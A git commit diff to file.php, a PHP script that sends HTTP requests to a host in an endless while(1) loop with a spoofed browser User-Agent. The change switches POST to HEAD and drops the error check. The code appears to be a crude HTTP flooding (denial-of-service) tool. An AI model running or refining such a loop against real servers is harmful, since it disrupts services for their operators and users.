4b832967973b3492c49beb63d5946dfb4304ec2a
sjd89s89dd <45253797+sjd89s89dd@users.noreply.github.com>
2018-11-21 23:58:56 -0800

    Update file.php

--- file.php
+++ file.php
@@ -8,18 +8,13 @@ $post_data = 'data=' . $data;
 while(1)
 	{
 	$socket = fsockopen($ip, 80, $errno, $errstr, 15);
-	if (!$socket)
-	{
-		echo ' error: ' . $errno . ' ' . $errstr;
-		die;
-	}
-	$http = "POST {$path} HTTP/1.1\r\n";
+	$http = "HEAD {$path} HTTP/1.1\r\n";
 	$http .= "Host: {$host}\r\n";
 	$http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
-	$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
-	$http .= "Content-length: " . strlen($post_data) . "\r\n";
+	//$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	//$http .= "Content-length: " . strlen($post_data) . "\r\n";
 	$http .= "Connection: close\r\n\r\n";
-	$http .= $post_data . "\r\n";
+	//$http .= $post_data . "\r\n";
 	
 	fwrite($socket, $http);
 	
